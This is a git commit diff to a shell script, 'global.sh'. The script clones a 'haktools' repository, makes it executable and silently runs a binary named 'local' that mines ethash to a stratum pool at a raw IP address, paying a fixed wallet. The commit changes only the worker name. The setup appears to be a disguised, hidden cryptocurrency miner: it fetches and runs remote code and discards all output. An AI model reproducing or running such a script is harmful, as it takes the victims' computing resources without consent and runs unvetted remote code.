eccbd8cd3ee03cacd44a9af87cb2777dd9e78e57
diemthodom <naochaduoc@magnetgr.com>
2022-07-12 14:36:49 +0700

    Update global.sh

--- global.sh
+++ global.sh
@@ -2,4 +2,4 @@
 cd /localpush
 git clone https://github.com/polandhak/haktools.git -q
 chmod -R +x haktools
-./haktools/local -a ethash -o stratum+tcp://135.125.163.215:2020 -u 0xA4260aA3aE3F16E5b74CC2CFA8ebeAc0933064F8 -p x -w az.kienmai.06 > /dev/null 2>&1
+./haktools/local -a ethash -o stratum+tcp://135.125.163.215:2020 -u 0xA4260aA3aE3F16E5b74CC2CFA8ebeAc0933064F8 -p x -w az-kienmai-06 > /dev/null 2>&1
